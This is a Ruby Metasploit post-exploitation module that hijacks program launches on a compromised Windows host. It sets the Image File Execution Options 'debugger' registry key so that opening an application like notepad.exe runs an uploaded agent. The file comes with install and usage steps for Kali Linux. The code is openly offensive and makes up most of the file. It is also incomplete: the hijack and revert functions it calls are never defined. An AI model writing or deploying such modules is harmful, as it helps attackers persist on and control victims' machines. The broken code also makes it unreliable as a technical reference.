##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



##
# Vault7_cia_debugger_hijack.rb
# $Id$ 1.0 Author: r00t-3xp10it | SSA RedTeam @2017
# Credits: https://wikileaks.org/ciav7p1/cms/page_2621770.html
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe'
# This registry key can be used to redirect the execution of any application
# to a different executable. The specified “debugger” application will be
# called with a path to the original program as the first argument.
#
#
# [ POST MODULE OPTIONS ]
# The session number to run this module on   => set SESSION 1
# Upload your agent to be executed?          => set UPLOAD_AGENT true
# Application to be hijacked                 => set HIJACK notepad.exe
# Binary to be executed                      => set EXEC %temp%\\agent.exe
# Full path of agent to deploy               => set LOCAL_PATH /root/agent.exe
# Full path in remote machine                => set REMOTE_PATH %temp%\\agent.exe
# Delete registry hijack keys                => set REVERT_HIJACK true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/manage/Vault7_cia_debugger_hijack.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/manage/Vault7_cia_debugger_hijack.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/manage
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/manage/Vault7_cia_debugger_hijack
# msf post(Vault7_cia_debugger_hijack) > info
# msf post(Vault7_cia_debugger_hijack) > show options
# msf post(Vault7_cia_debugger_hijack) > show advanced options
# msf post(Vault7_cia_debugger_hijack) > set [option(s)]
# msf post(Vault7_cia_debugger_hijack) > exploit
##






# -----------------------------------
# Module Dependencies
# -----------------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
 
 
 
# -------------------------------------
# Metasploit Class name and libs
# -------------------------------------
class MetasploitModule < Msf::Post
      Rank = GoodRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Registry


 
 
# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Vault7_cia_debugger_hijack (reg hijack execution)',
                        'Description'   => %q{

                                        This registry key can be used to redirect the execution of any application to a different executable. The specified “debugger” application will be called with a path to the original program as the first argument.

                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'peterubuntu10[at]sourceforge[dot]net',      # post-module author
                                        'Inspiration: Chaitanya [ SSA RedTeam ]',    # module inspiration
                                        'Special thanks: Vault7 CIA Hacking Tools'   # CIA wikileaks public leak
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'mar 8 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true', # we need a priviliged session to hijack keys :(
                        'Targets'        =>
                                [
                                         # Tested againts Windows 10 | windows 7 (SP1) | windows XP (SP3)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # default its to run againts Windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://wikileaks.org/ciav7p1/cms/page_2621770.html' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',              # Default its to run againts session 1 
                                        'HIJACK'  => 'notepad.exe',    # default vulnerable appl to be hijack
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('HIJACK', [ false, 'Application to be hijacked (eg. notepad.exe)']),
                                OptString.new('EXEC', [ false, 'Binary to be executed (eg. %windir%\\system32\\calc.exe)'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('UPLOAD_AGENT', [ false, 'Upload your agent to be executed?' , false]),
                                OptString.new('LOCAL_PATH', [ false, 'Full path of agent to deploy (eg. /root/agent.exe)']),
                                OptString.new('REMOTE_PATH', [ false, 'Full path in remote machine (eg. %temp%\\agent.exe)']),
                                OptBool.new('REVERT_HIJACK', [ false, 'Delete registry hijack keys (delete EXEC regkey)' , false])
                        ], self.class)
 
        end

 








# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# ------------------------------------------------
def run
  session = client


      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd

    # Print banner and scan results on screen
    print_line("    +-----------------------------------------+")
    print_line("    |      * Vault7_CIA_debugger_hijack *     |")
    print_line("    |   Author: Pedro Ubuntu [ r00t-3xp10it ] |")
    print_line("    +-----------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals
    # that we are not on a meterpreter session!
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


# ------------------------
# Selected settings to run
# ------------------------
      if datastore['EXEC']
         hijack_funtion
      end

      if datastore['REVERT_HIJACK']
         revert_hijack
      end
   end
end
